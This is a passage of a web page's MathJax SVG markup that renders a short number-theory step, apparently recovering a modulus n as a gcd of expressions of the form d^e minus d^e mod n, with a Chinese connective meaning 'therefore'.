0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(7045.5,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(7212.5,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(7546.2,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(8146.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="19.382ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8566.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(600,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msup" transform="translate(878,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mo" transform="translate(2032.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(3033,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(3422,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mspace" transform="translate(4354.5,0)"></g><g data-mml-node="mi" transform="translate(5188.1,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(7077.1,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(7244.1,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(7577.8,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(8177.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>, 所以 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="48.678ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 21515.6 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(877.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1933.6,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(2516.8,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(3517,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(3994,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(4427,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(4947,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(5336,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,363) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mo" transform="translate(6474.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(7475.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(7864.1,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,363) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mspace" transform="translate(8780.8,0)"></g><g data-mml-node="mi" transform="translate(9614.5,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(11503.5,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(11670.5,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(12004.2,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(12604.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(12993.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msup" transform="translate(13437.8,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mo" transform="translate(14592.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(15592.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(15981.8,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mspace" transform="translate(16914.3,0)"></g><g data-mml-node="mi" transform="translate(17748,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(19637,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(19804,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(20137.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(20737.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 